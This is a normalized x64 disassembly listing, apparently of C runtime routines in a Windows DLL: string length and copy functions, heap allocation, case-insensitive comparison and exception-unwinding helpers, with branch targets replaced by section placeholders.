lea rcx [ rdx + rdx * 4 ]
movsxd rcx [ r10 + rcx * 4 + 0x10 ]
mov rcx [ rcx + rax ]
mov [ rsp + 0x50 ] rcx
add edx 0x1
add rcx 0x14
cmp edx r8d
jb r-xdata
movsxd rax [ rcx ]
cmp rax r9
je r-xdata
sub_180006c70
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x40
mov rbx r9
mov rdi r8
mov rsi rcx
mov [ rsp + 0x50 ] rdx
call sub_18000a690
mov rdx [ rbx + 0x8 ]
mov [ rax + 0x128 ] rdx
call sub_18000a690
mov rdx [ rsi + 0x38 ]
mov [ rax + 0x130 ] rdx
call sub_18000a690
mov rdx [ rbx + 0x38 ]
mov r8d [ rdx ]
lea rdx [ rsp + 0x50 ]
mov r9 rbx
add r8 [ rax + 0x128 ]
xor eax eax
mov rcx rsi
mov [ rsp + 0x38 ] eax
mov [ rsp + 0x30 ] rax
mov [ rsp + 0x28 ] eax
mov [ rsp + 0x20 ] r8
mov r8 rdi
call sub_18000c310
mov rbx [ rsp + 0x58 ]
mov rsi [ rsp + 0x60 ]
add rsp 0x40
pop rdi
retn
sub_180006d00
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x40
mov rsi r9
mov rbp r8
mov rbx rdx
mov rdi rcx
call sub_18000a690
mov [ rax + 0x138 ] rbx
mov rbx [ rdi ]
call sub_18000a690
mov rdx [ rbx + 0x38 ]
mov rcx [ rsp + 0x78 ]
mov r9 [ rsp + 0x70 ]
mov [ rsp + 0x38 ] 0x1
mov [ rax + 0x130 ] rdx
xor ebx ebx
mov [ rsp + 0x30 ] rbx
mov [ rsp + 0x28 ] ebx
mov [ rsp + 0x20 ] rcx
mov rcx [ rdi ]
mov r8 rsi
mov rdx rbp
call sub_18000c310
call sub_18000a690
mov rcx [ rsp + 0x80 ]
mov rbp [ rsp + 0x58 ]
mov rsi [ rsp + 0x60 ]
mov [ rax + 0x138 ] rbx
lea eax [ rbx + 0x1 ]
mov rbx [ rsp + 0x50 ]
mov [ rcx ] 0x1
add rsp 0x40
pop rdi
retn
sub_180006db0
mov rax rsp
mov [ rax + 0x20 ] r9
mov [ rax + 0x18 ] r8
mov [ rax + 0x10 ] rdx
mov [ rax + 0x8 ] rcx
push rbx
sub rsp 0x60
mov rbx rcx
mov [ rax - 0x28 ] 0x0
mov [ rax - 0x20 ] rcx
mov [ rax - 0x18 ] r8
call sub_18000a690
mov r8 [ rax + 0xe0 ]
lea rdx [ rsp + 0x48 ]
mov ecx [ rbx ]
call r8
mov [ rsp + 0x40 ] 0x0
jmp r-xdata
mov eax [ rsp + 0x40 ]
add rsp 0x60
pop rbx
retn
sub_180006e10
push rbp
sub rsp 0x40
mov rbp rdx
lea rax [ rbp + 0x40 ]
mov [ rsp + 0x30 ] rax
mov rax [ rbp + 0x90 ]
mov [ rsp + 0x28 ] rax
mov rax [ rbp + 0x88 ]
mov [ rsp + 0x20 ] rax
mov r9 [ rbp + 0x80 ]
mov r8 [ rbp + 0x78 ]
mov rdx [ rbp + 0x70 ]
call sub_180006d00
add rsp 0x40
pop rbp
retn
sub_180006e60
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
push r12
push r13
sub rsp 0x20
movsxd rsi [ rdx + 0xc ]
mov r13 [ rsp + 0x70 ]
mov r12 rdx
mov rcx r12
mov rdx r13
mov ebp r9d
xor edi edi
call sub_180009fd0
test esi esi
mov ebx eax
jne r-xdata
test esi esi
mov r10 [ rsp + 0x68 ]
mov r9 [ rsp + 0x60 ]
mov [ r10 ] 0xffffffff
mov [ r9 ] 0xffffffff
mov r8d esi
je r-xdata
call sub_18000c560
test r8d r8d
je r-xdata
movsxd rcx [ r12 + 0x10 ]
lea rax [ rsi + rsi * 4 ]
lea rcx [ rcx + rax * 4 ]
mov rax [ r13 + 0x8 ]
lea rdx [ rcx + rax - 0xc ]
xor edx edx
test esi esi
je r-xdata
lea eax [ r8 - 0x1 ]
lea rdx [ rax + rax * 4 ]
movsxd rax [ r12 + 0x10 ]
lea rdi [ rax + rdx * 4 ]
add rdi [ r13 + 0x8 ]
sub rdx 0x14
add r8d 0xffffffff
jne r-xdata
cmp ebx [ rdx ]
jle r-xdata
mov [ r9 ] 0x0
xor eax eax
mov [ r10 ] 0x0
xor r8d r8d
nop
nop
cmp ebx [ rdx - 0x4 ]
jle r-xdata
cmp ebp [ rcx ]
jl r-xdata
mov eax [ rdi + 0x4 ]
cmp [ rcx ] eax
jle r-xdata
add edx 0x1
add r8 0x14
cmp edx esi
jb r-xdata
cmp ebp [ rcx + 0x4 ]
jg r-xdata
mov eax [ rdi + 0x8 ]
cmp [ rcx + 0x4 ] eax
jg r-xdata
movsxd rcx [ r12 + 0x10 ]
add rcx [ r13 + 0x8 ]
add rcx r8
test rdi rdi
je r-xdata
mov eax [ r9 ]
cmp eax 0xffffffff
je r-xdata
cmp [ r9 ] 0xffffffff
jne r-xdata
lea rcx [ rax + rax * 4 ]
movsxd rax [ r12 + 0x10 ]
lea rax [ rax + rcx * 4 ]
add rax [ r13 + 0x8 ]
jmp r-xdata
lea eax [ rdx + 0x1 ]
mov [ r10 ] eax
mov [ r9 ] edx
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
add rsp 0x20
pop r13
pop r12
pop rdi
retn
sub_180006fa0
push rbx
sub rsp 0x20
mov rbx rcx
mov [ rcx ] rdx
call sub_18000a690
cmp rbx [ rax + 0x120 ]
jae r-xdata
xor ecx ecx
call sub_18000a690
mov rcx [ rax + 0x120 ]
jmp r-xdata
mov [ rbx + 0x8 ] rcx
call sub_18000a690
mov [ rax + 0x120 ] rbx
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_180006ff0
push rbx
sub rsp 0x20
mov rbx rcx
call sub_18000a690
mov rdx [ rax + 0x120 ]
test rdx rdx
je r-xdata
mov eax 0x1
add rsp 0x20
pop rbx
retn
nop
nop
xor eax eax
add rsp 0x20
pop rbx
retn
mov rdx [ rdx + 0x8 ]
test rdx rdx
jne r-xdata
cmp [ rdx ] rbx
je r-xdata
sub_180007040
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rdi rcx
call sub_18000a690
cmp rdi [ rax + 0x120 ]
je r-xdata
call sub_18000a690
mov rbx [ rax + 0x120 ]
test rbx rbx
je r-xdata
call sub_18000c560
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
jmp sub_18000c560
cmp rdi rbx
je r-xdata
call sub_18000a690
mov rcx [ rbx + 0x8 ]
mov rbx [ rsp + 0x30 ]
mov [ rax + 0x120 ] rcx
add rsp 0x20
pop rdi
retn
mov rbx [ rbx + 0x8 ]
test rbx rbx
jne r-xdata
sub_1800070b0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x5a0
mov rsi rdx
mov rbp rcx
mov rdi r8
lea rcx [ rsp + 0x30 ]
lea rdx [ r--data ]
mov r8d 0x98
mov rbx r9
call sub_18000aa30
mov rax [ rsp + 0x5d0 ]
mov rdx [ rsp + 0x5e8 ]
mov rcx [ rbp ]
mov [ rsp + 0x60 ] rax
movsxd rax [ rsp + 0x5d8 ]
lea r11 [ sub_18000b430 ]
lea r8 [ rsp + 0x30 ]
mov [ rsp + 0x68 ] rax
mov rax [ rsp + 0x5e0 ]
xor r9d r9d
mov [ rsp + 0x78 ] rax
movzx eax [ rsp + 0x5f0 ]
mov [ rsp + 0x50 ] r11
mov [ rsp + 0x88 ] rax
mov rax [ rdx + 0x40 ]
mov rdx [ rdx ]
mov [ rsp + 0x28 ] rax
lea rax [ rsp + 0xd0 ]
mov [ rsp + 0x58 ] rbx
mov [ rsp + 0x70 ] rdi
mov [ rsp + 0x80 ] rsi
mov [ rsp + 0x90 ] 0x19930520
mov [ rsp + 0x20 ] rax
call RtlUnwindEx
lea r11 [ rsp + 0x5a0 ]
mov rbx [ r11 + 0x10 ]
mov rbp [ r11 + 0x18 ]
mov rsi [ r11 + 0x20 ]
mov rsp r11
pop rdi
retn
sub_1800071b0
mov rax rcx
neg rcx
test rax 0x7
je r-xdata
mov r8 0x7efefefefefefeff
mov r11 0x8101010101010100
nop
mov rdx [ rax ]
mov r9 r8
add rax 0x8
add r9 rdx
not rdx
xor rdx r9
and rdx r11
je r-xdata
mov rdx [ rax - 0x8 ]
test dl dl
je r-xdata
lea rax [ rcx + rax - 0x1 ]
retn
test al 0x7
jne r-xdata
lea rax [ rcx + rax - 0x8 ]
retn
test dh dh
je r-xdata
mov dl [ rax ]
inc rax
test dl dl
je r-xdata
lea rax [ rcx + rax - 0x7 ]
retn
shr rdx 0x10
test dl dl
je r-xdata
lea rax [ rcx + rax - 0x6 ]
retn
test dh dh
je r-xdata
lea rax [ rcx + rax - 0x5 ]
retn
shr rdx 0x10
test dl dl
je r-xdata
lea rax [ rcx + rax - 0x4 ]
retn
test dh dh
je r-xdata
lea rax [ rcx + rax - 0x3 ]
retn
shr edx 0x10
test dl dl
je r-xdata
lea rax [ rcx + rax - 0x2 ]
retn
test dh dh
jne r-xdata
sub_180007260
sub rsp 0x38
test rcx rcx
mov r9 rcx
je r-xdata
call sub_180008e80
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] 0x0
mov [ rax ] 0x16
call sub_180008d20
mov eax 0x16
add rsp 0x38
retn
test rdx rdx
je r-xdata
test r8 r8
jne r-xdata
movzx eax [ r8 ]
add rcx 0x1
add r8 0x1
test al al
mov [ rcx - 0x1 ] al
je r-xdata
mov [ rcx ] r8b
test rdx rdx
jne r-xdata
sub rdx 0x1
jne r-xdata
xor eax eax
add rsp 0x38
retn
mov [ r9 ] dl
call sub_180008e80
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] 0x22
mov [ rsp + 0x20 ] 0x0
call sub_180008d20
mov eax 0x22
add rsp 0x38
retn
sub_180007310
push rbx
sub rsp 0x20
cmp rcx 0xffffffffffffffe0
mov rbx rcx
ja r-xdata
call sub_18000c980
call sub_180008e80
mov [ rax ] 0xc
xor eax eax
add rsp 0x20
pop rbx
retn
mov [ rsp + 0x30 ] rsi
test rcx rcx
mov esi 0x1
cmovne rsi rcx
mov [ rsp + 0x38 ] rdi
nop
nop
mov r8 rsi
xor edx edx
call [ HeapAlloc@IAT ]
test rax rax
mov rdi rax
jne r-xdata
call sub_18000c7f0
mov ecx 0x1e
call sub_18000c5b0
mov ecx 0xff
call sub_180009460
mov rsi [ rsp + 0x30 ]
mov rax rdi
mov rdi [ rsp + 0x38 ]
add rsp 0x20
pop rbx
retn
cmp [ rw-data ] eax
je r-xdata
call sub_180008e80
mov [ rax ] 0xc
mov rcx rbx
call sub_18000c980
test eax eax
jne r-xdata
mov rcx [ rw-data ]
test rcx rcx
jne r-xdata
jmp r-xdata
call sub_180008e80
mov [ rax ] 0xc
sub_1800073e0
movzx eax [ rcx ]
test al al
je r-xdata
cmp [ rcx ] dl
jne r-xdata
cmp al dl
je r-xdata
xor eax eax
retn
mov rax rcx
retn
mov al [ rcx + 0x1 ]
add rcx 0x1
test al al
jne r-xdata
sub_180007410
push rbx
sub rsp 0x60
mov rax [ r--data ]
mov rbx rdx
lea rdx [ rsp + 0x20 ]
mov [ rdx ] rax
mov rax [ r--data ]
mov [ rdx + 0x8 ] rax
mov rax [ r--data ]
mov [ rdx + 0x10 ] rax
mov rax [ r--data ]
mov [ rdx + 0x18 ] rax
mov rax [ r--data ]
mov [ rdx + 0x20 ] rax
mov rax [ r--data ]
mov [ rdx + 0x28 ] rax
mov rax [ r--data ]
mov [ rdx + 0x30 ] rax
mov rax [ r--data ]
mov [ rdx + 0x38 ] rax
mov [ rsp + 0x48 ] rcx
lea rdx [ rsp + 0x70 ]
mov rcx rbx
mov [ rsp + 0x50 ] rbx
call RtlPcToFileHeader
test rbx rbx
mov r11 rax
mov [ rsp + 0x70 ] rax
mov [ rsp + 0x58 ] rax
je r-xdata
mov r8d [ rsp + 0x38 ]
mov edx [ rsp + 0x24 ]
mov ecx [ rsp + 0x20 ]
lea r9 [ rsp + 0x40 ]
call [ RaiseException@IAT ]
add rsp 0x60
pop rbx
retn
test [ rbx ] 0x8
mov ecx 0x1994000
je r-xdata
mov eax [ rsp + 0x40 ]
test r11 r11
cmove eax ecx
mov [ rsp + 0x40 ] eax
mov [ rsp + 0x40 ] ecx
jmp r-xdata
sub_1800074e0
push rbx
sub rsp 0x40
mov rbx rcx
call sub_180007310
test rax rax
jne r-xdata
add rsp 0x40
pop rbx
retn
mov rcx rbx
call sub_18000c980
test eax eax
je r-xdata
mov eax [ rw-data ]
lea rbx [ r--data ]
test al 0x1
jne r-xdata
mov rcx rbx
call sub_180007310
test rax rax
je r-xdata
lea rdx [ rw-data ]
lea rcx [ rsp + 0x20 ]
call sub_1800076c0
lea rdx [ r--data ]
lea rcx [ rsp + 0x20 ]
mov [ rsp + 0x20 ] rbx
call sub_180007410
int3
or eax 0x1
lea rdx [ rw-data ]
lea rcx [ rw-data ]
mov r8d 0x1
mov [ rw-data ] eax
call sub_1800076a0
lea rcx [ sub_180013440 ]
mov [ rw-data ] rbx
call sub_180008210
sub_180007580
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rax [ r--data ]
mov ebx edx
mov rdi rcx
mov [ rcx ] rax
call sub_18000c9c0
test bl 0x1
je r-xdata
mov rax rdi
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rdi
call j_sub_1800085f0#2
sub_1800075c0
lea r8 [ rcx + 0x11 ]
add rdx 0x11
sub r8 rdx
nop
nop
test ecx ecx
sete al
retn
add rdx 0x1
test eax eax
jne r-xdata
movzx ecx [ rdx ]
movzx eax [ rdx + r8 ]
sub ecx eax
jne r-xdata
sub_180007610
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
lea rax [ r--data ]
mov rsi rdx
mov rbx rcx
mov [ rcx ] rax
mov rdi [ rdx ]
test rdi rdi
je r-xdata
mov rsi [ rsp + 0x38 ]
mov rax rbx
mov rbx [ rsp + 0x30 ]
mov [ rcx + 0x8 ] 0x0
mov [ rcx + 0x10 ] 0x1
add rsp 0x20
pop rdi
retn
or rcx 0xffffffffffffffff
xor eax eax
[ rdi ]
not rcx
lea rdi [ rcx - 0x1 ]
call sub_180007310
test rax rax
mov [ rbx + 0x8 ] rax
je r-xdata
mov [ rbx + 0x10 ] 0x1
mov rax rbx
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
mov r8 [ rsi ]
lea rdx [ rdi + 0x1 ]
mov rcx rax
call sub_180007260
sub_1800076c0
mov [ rsp + 0x10 ] rbx
push rsi
sub rsp 0x20
lea rax [ r--data ]
mov rsi rdx
mov rbx rcx
mov [ rcx ] rax
mov eax [ rdx + 0x10 ]
test eax eax
mov [ rcx + 0x10 ] eax
je r-xdata
mov rax [ rdx + 0x8 ]
mov rbx [ rsp + 0x38 ]
mov [ rcx + 0x8 ] rax
mov rax rcx
add rsp 0x20
pop rsi
retn
mov [ rsp + 0x30 ] rdi
mov rdi [ rdx + 0x8 ]
test rdi rdi
je r-xdata
mov rdi [ rsp + 0x30 ]
mov [ rcx + 0x8 ] 0x0
mov rax rbx
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rsi
retn
or rcx 0xffffffffffffffff
xor eax eax
[ rdi ]
not rcx
lea rdi [ rcx - 0x1 ]
call sub_180007310
test rax rax
mov [ rbx + 0x8 ] rax
je r-xdata
mov rax rbx
mov rdi [ rsp + 0x30 ]
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rsi
retn
mov r8 [ rsi + 0x8 ]
lea rdx [ rdi + 0x1 ]
mov rcx rax
call sub_180007260
sub_1800077c0
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
cmp [ rcx + 0x10 ] 0x0
lea rax [ r--data ]
mov edi edx
mov [ rcx ] rax
mov rbx rcx
je r-xdata
test dil 0x1
je r-xdata
mov rcx [ rcx + 0x8 ]
call sub_1800085f0
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rbx
call j_sub_1800085f0#2
sub_180007830
sub rsp 0x38
test r9 r9
mov rax r8
je r-xdata
xor eax eax
add rsp 0x38
retn
test rcx rcx
jne r-xdata
test rax rax
je r-xdata
call sub_180008e80
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] 0x0
mov [ rax ] 0x16
call sub_180008d20
mov eax 0x16
add rsp 0x38
retn
cmp rdx r9
jae r-xdata
mov r8 r9
mov rdx rax
call sub_18000aa30
call sub_180008e80
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] 0x0
mov [ rax ] 0x22
call sub_180008d20
mov eax 0x22
add rsp 0x38
retn
sub_1800078c0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x30
test r9 r9
mov rbx r9
mov rsi r8
mov rdi rdx
je r-xdata
xor eax eax
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
add rsp 0x30
pop rdi
retn
test rcx rcx
jne r-xdata
test r8 r8
je r-xdata
call sub_180008e80
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] 0x0
mov [ rax ] 0x16
call sub_180008d20
mov r8 rdx
xor edx edx
call sub_1800059c0
test rsi rsi
je r-xdata
cmp rdx rbx
jb r-xdata
cmp rdi rbx
jae r-xdata
mov r8 rbx
mov rdx rsi
call sub_18000aa30
mov eax 0x16
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
add rsp 0x30
pop rdi
retn
call sub_180008e80
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] 0x0
mov [ rax ] 0x22
call sub_180008d20
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
mov eax 0x22
add rsp 0x30
pop rdi
retn
sub_180007990
push rbx
sub rsp 0x20
mov eax [ r8 ]
mov rbx rdx
mov r9 rcx
mov r11d eax
mov r10 rcx
and r11d 0xfffffff8
test al 0x4
je r-xdata
movsxd rax r11d
mov rdx [ rax + r10 ]
mov rax [ rbx + 0x10 ]
mov ecx [ rax + 0x8 ]
add rcx [ rbx + 0x8 ]
movzx eax [ rcx + 0x3 ]
test al 0xf
je r-xdata
mov eax [ r8 + 0x8 ]
movsxd r10 [ r8 + 0x4 ]
neg eax
add r10 rcx
movsxd rcx eax
and r10 rcx
xor r9 rdx
mov rcx r9
add rsp 0x20
pop rbx
jmp sub_180006970
movzx eax al
and eax 0xfffffff0
cdqe
add r9 rax
sub_180007a00
sub rsp 0x28
mov rcx [ r9 + 0x38 ]
mov r10 r9
mov r8 rdx
mov eax [ rcx ]
mov r9d eax
and r9d 0xfffffff8
test al 0x4
je r-xdata
movsxd rax r9d
mov r9 [ rax + r8 ]
mov rax [ r10 + 0x10 ]
mov ecx [ rax + 0x8 ]
add rcx [ r10 + 0x8 ]
movzx eax [ rcx + 0x3 ]
test al 0xf
je r-xdata
mov eax [ rcx + 0x8 ]
movsxd r8 [ rcx + 0x4 ]
neg eax
add r8 rdx
movsxd rcx eax
and r8 rcx
xor rdx r9
mov rcx rdx
call sub_180006970
mov eax 0x1
add rsp 0x28
retn
movzx eax al
and eax 0xfffffff0
cdqe
add rdx rax
sub_180007a70
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x50
test r8 r8
mov rsi rdx
mov rdi rcx
mov [ rsp + 0x48 ] 0x0
jne r-xdata
mov rax [ r8 ]
lea rcx [ rsp + 0x30 ]
mov [ rcx ] rax
mov rax [ r8 + 0x8 ]
mov [ rcx + 0x8 ] rax
mov r11 [ rsp + 0x40 ]
call sub_18000a690
mov [ rsp + 0x40 ] rax
mov r11 rax
mov r8 [ rax + 0xc0 ]
cmp r8 [ rw-data ]
mov [ rsp + 0x30 ] r8
mov rax [ rax + 0xb8 ]
mov [ rsp + 0x38 ] rax
je r-xdata
test rsi rsi
je r-xdata
call sub_180008e80
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] 0x0
mov [ rax ] 0x16
call sub_180008d20
cmp [ rsp + 0x48 ] 0x0
je r-xdata
cmp rax [ rw-data ]
je r-xdata
mov ecx [ r11 + 0xc8 ]
test [ rw-data ] ecx
jne r-xdata
mov rax [ rsp + 0x30 ]
mov [ rsp + 0x60 ] rbx
cmp [ rax + 0x14 ] 0x0
jne r-xdata
mov eax 0x7fffffff
mov rsi [ rsp + 0x68 ]
add rsp 0x50
pop rdi
retn
mov rax [ rsp + 0x40 ]
and [ rax + 0xc8 ] 0xfffffffd
test [ r11 + 0xc8 ] 0x2
jne r-xdata
mov eax [ r11 + 0xc8 ]
test [ rw-data ] eax
jne r-xdata
call sub_18000d880
mov r11 [ rsp + 0x40 ]
mov [ rsp + 0x30 ] rax
mov rax [ rsp + 0x38 ]
movzx ecx [ rdi ]
lea rdx [ rsp + 0x30 ]
call sub_18000d920
movzx ecx [ rsi ]
lea rdx [ rsp + 0x30 ]
mov bx ax
add rdi 0x2
call sub_18000d920
add rsi 0x2
test bx bx
je r-xdata
nop
test rdi rdi
jne r-xdata
or [ r11 + 0xc8 ] 0x2
mov r11 [ rsp + 0x40 ]
mov [ rsp + 0x48 ] 0x1
jmp r-xdata
call sub_18000cd30
mov r11 [ rsp + 0x40 ]
mov [ rsp + 0x38 ] rax
mov r11 [ rsp + 0x40 ]
cmp bx ax
je r-xdata
movzx eax [ rsi ]
cmp ax 0x41
jb r-xdata
cmp bx 0x5a
ja r-xdata
mov rsi [ rsp + 0x68 ]
add rsp 0x50
pop rdi
retn
and [ r11 + 0xc8 ] 0xfffffffd
add rdi 0x2
add rsi 0x2
test bx bx
je r-xdata
cmp ax 0x5a
ja r-xdata
add bx 0x20
movzx ecx ax
movzx eax bx
mov rbx [ rsp + 0x60 ]
sub eax ecx
cmp [ rsp + 0x48 ] 0x0
je r-xdata
cmp bx ax
je r-xdata
add ax 0x20
movzx ebx [ rdi ]
cmp bx 0x41
jb r-xdata
jmp r-xdata
sub_180007c40
sub rsp 0x38
cmp [ rw-data ] 0x0
mov r9 rcx
jne r-xdata
xor r8d r8d
add rsp 0x38
jmp sub_180007a70
test rcx rcx
jne r-xdata
test rdx rdx
je r-xdata
call sub_180008e80
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] 0x0
mov [ rax ] 0x16
call sub_180008d20
mov eax 0x7fffffff
add rsp 0x38
retn
nop
nop
movzx ecx [ rdx ]
cmp cx 0x41
jb r-xdata
cmp ax 0x5a
ja r-xdata
add r9 0x2
add rdx 0x2
test ax ax
je r-xdata
cmp cx 0x5a
ja r-xdata
add ax 0x20
movzx ecx cx
movzx eax ax
sub eax ecx
add rsp 0x38
retn
cmp ax cx
je r-xdata
add cx 0x20
movzx eax [ r9 ]
cmp ax 0x41
jb r-xdata
sub_180007cf0
mov r8 rcx
movzx eax [ rcx ]
add rcx 0x2
test ax ax
jne r-xdata
nop
cmp [ rcx ] dx
jne r-xdata
cmp [ rcx ] dx
jne r-xdata
xor eax eax
retn
mov rax rcx
retn
sub rcx 0x2
cmp rcx r8
je r-xdata
mov rax rcx
retn
sub_180007d20
mov [ rsp + 0x10 ] rbx
push rdi
sub rsp 0x50
test r8 r8
mov rdi rdx
mov rbx rcx
mov [ rsp + 0x48 ] 0x0
jne r-xdata
mov rax [ r8 ]
lea rcx [ rsp + 0x30 ]
mov [ rcx ] rax
mov rax [ r8 + 0x8 ]
mov [ rcx + 0x8 ] rax
mov r11 [ rsp + 0x40 ]
call sub_18000a690
mov [ rsp + 0x40 ] rax
mov r11 rax
mov r8 [ rax + 0xc0 ]
cmp r8 [ rw-data ]
mov [ rsp + 0x30 ] r8
mov rax [ rax + 0xb8 ]
mov [ rsp + 0x38 ] rax
je r-xdata
test rdi rdi
je r-xdata
call sub_180008e80
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] 0x0
mov [ rax ] 0x16
call sub_180008d20
cmp [ rsp + 0x48 ] 0x0
je r-xdata
cmp rax [ rw-data ]
je r-xdata
mov ecx [ r11 + 0xc8 ]
test [ rw-data ] ecx
jne r-xdata
mov rax [ rsp + 0x30 ]
cmp [ rax + 0x14 ] 0x0
jne r-xdata
mov eax 0x7fffffff
mov rbx [ rsp + 0x68 ]
add rsp 0x50
pop rdi
retn
mov rax [ rsp + 0x40 ]
and [ rax + 0xc8 ] 0xfffffffd
test [ r11 + 0xc8 ] 0x2
jne r-xdata
mov eax [ r11 + 0xc8 ]
test [ rw-data ] eax
jne r-xdata
call sub_18000d880
mov r11 [ rsp + 0x40 ]
mov [ rsp + 0x30 ] rax
mov rax [ rsp + 0x38 ]
mov [ rsp + 0x60 ] rsi
nop
nop
nop
nop
test rbx rbx
jne r-xdata
or [ r11 + 0xc8 ] 0x2
mov r11 [ rsp + 0x40 ]
mov [ rsp + 0x48 ] 0x1
jmp r-xdata
call sub_18000cd30
mov r11 [ rsp + 0x40 ]
mov [ rsp + 0x38 ] rax
sub esi eax
cmp [ rsp + 0x48 ] 0x0
je r-xdata
cmp esi eax
je r-xdata
movzx edx [ rdi ]
add rdi 0x1
lea eax [ rdx - 0x41 ]
cmp eax 0x19
ja r-xdata
add ecx 0x20
mov rbx [ rsp + 0x68 ]
mov eax esi
mov rsi [ rsp + 0x60 ]
add rsp 0x50
pop rdi
retn
mov rcx [ rsp + 0x40 ]
and [ rcx + 0xc8 ] 0xfffffffd
movzx ecx [ rbx ]
lea rdx [ rsp + 0x30 ]
call sub_18000dad0
movzx ecx [ rdi ]
lea rdx [ rsp + 0x30 ]
mov esi eax
add rbx 0x1
call sub_18000dad0
add rdi 0x1
test esi esi
je r-xdata
test ecx ecx
je r-xdata
add edx 0x20
sub ecx edx
cmp [ rsp + 0x48 ] 0x0
je r-xdata
cmp ecx edx
je r-xdata
mov eax ecx
mov rbx [ rsp + 0x68 ]
add rsp 0x50
pop rdi
retn
and [ r11 + 0xc8 ] 0xfffffffd
movzx ecx [ rbx ]
add rbx 0x1
lea eax [ rcx - 0x41 ]
cmp eax 0x19
ja r-xdata
sub_180007f00
sub rsp 0x38
cmp [ rw-data ] 0x0
mov r10 rdx
mov r9 rcx
jne r-xdata
xor r8d r8d
add rsp 0x38
jmp sub_180007d20
test rcx rcx
jne r-xdata
test rdx rdx
je r-xdata
call sub_180008e80
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] 0x0
mov [ rax ] 0x16
call sub_180008d20
mov eax 0x7fffffff
add rsp 0x38
retn
nop
nop
movzx edx [ r10 ]
add r10 0x1
lea eax [ rdx - 0x41 ]
cmp eax 0x19
ja r-xdata
add ecx 0x20
test ecx ecx
je r-xdata
add edx 0x20
sub ecx edx
mov eax ecx
add rsp 0x38
retn
cmp ecx edx
je r-xdata
movzx ecx [ r9 ]
add r9 0x1
lea eax [ rcx - 0x41 ]
cmp eax 0x19
ja r-xdata
sub_180007fa0
mov r8 rcx
movzx eax [ rcx ]
add rcx 0x1
test al al
jne r-xdata
nop
cmp [ rcx ] dl
jne r-xdata
cmp [ rcx ] dl
jne r-xdata
xor eax eax
retn
mov rax rcx
retn
sub rcx 0x1
cmp rcx r8
je r-xdata
mov rax rcx
retn
sub_180007fe0
sub rsp 0x38
test rcx rcx
mov r9 rcx
je r-xdata
call sub_180008e80
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] 0x0
mov [ rax ] 0x16
call sub_180008d20
mov eax 0x16
add rsp 0x38
retn
test rdx rdx
je r-xdata
test r8 r8
jne r-xdata
movzx eax [ r8 ]
add rcx 0x2
add r8 0x2
test ax ax
mov [ rcx - 0x2 ] ax
je r-xdata
mov [ rcx ] r8w
test rdx rdx
jne r-xdata
sub rdx 0x1
jne r-xdata
xor eax eax
add rsp 0x38
retn
mov [ r9 ] dx
call sub_180008e80
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] 0x22
mov [ rsp + 0x20 ] 0x0
call sub_180008d20
mov eax 0x22
add rsp 0x38
retn
sub_180008090
push rbx
sub rsp 0x20
mov edx 0x8
lea ecx [ rdx + 0x18 ]
call sub_180008870
mov rcx rax
mov rbx rax
call sub_18000a180
test rbx rbx
mov [ rw-data ] rax
mov [ rw-data ] rax
jne r-xdata
mov [ rbx ] 0x0
xor eax eax
add rsp 0x20
pop rbx
retn
lea eax [ rbx + 0x18 ]
add rsp 0x20
pop rbx
retn
sub_1800080e0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
push r12
push r13
push r14
sub rsp 0x20
mov rbx rcx
call sub_1800094a0
nop
mov rcx [ rw-data ]
call sub_18000a340
mov r13 rax
mov rcx [ rw-data ]
call sub_18000a340
mov rsi rax
cmp rax r13
jb r-xdata
xor ebx ebx
mov rdi rax
sub rdi r13
lea r14 [ rdi + 0x8 ]
cmp r14 0x8
jb r-xdata
mov rcx r13
call sub_18000e0f0
mov r12 rax
cmp rax r14
jae r-xdata
mov rcx rbx
call sub_18000a180
mov [ rsi ] rax
